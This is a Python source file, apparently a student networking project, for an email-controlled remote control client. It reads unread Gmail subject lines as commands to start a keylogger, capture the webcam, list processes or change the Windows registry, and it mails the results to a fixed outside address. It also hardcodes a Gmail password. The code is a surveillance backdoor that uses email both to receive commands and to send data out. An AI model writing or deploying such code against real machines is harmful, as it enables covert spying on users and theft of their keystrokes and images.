import ReceiveEmail
import SendEmail
import ListProcesses
import keylogger
from time import time, sleep
import WebcamCapture
import Registry

client_address = "client1.computernetwork@gmail.com"

client_pass="computernetwork" #unsecure

# guess_address = "lmtri.fit.hcmus@gmail.com"
guess_address = "letrong2307@gmail.com"
thread = None
def Handling(subject):
    global thread
    if subject == 'List Processes':
        content = ListProcesses.ListProcesses()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "Webcam Capture":
        content = WebcamCapture.CapturePath
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
    elif subject == "Start Key Logging":
        thread = keylogger.StartLogging()
        content = "Key logging has been launched"
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "End Key Logging":
        content =   keylogger.EndLogging(thread)
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[0] =="REGISTRY":
        content =  Registry.Registry(subject[1], subject[2], subject[3], subject[4], subject[5])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
      

def main():
    while True:
        # Nhận danh sách title của các thư "CHƯA ĐỌC"
        list = ReceiveEmail.ReceiveEmail(client_address,client_pass)
        if len(list):
            for i in list:
                #Xử lý các title tương ứng
                Handling(i)
        sleep(5)
        # else:
        #     print("Không có thư nào chưa đọc")
        # break
        # Handling("demo send picture")
        # break


#======================================================

main()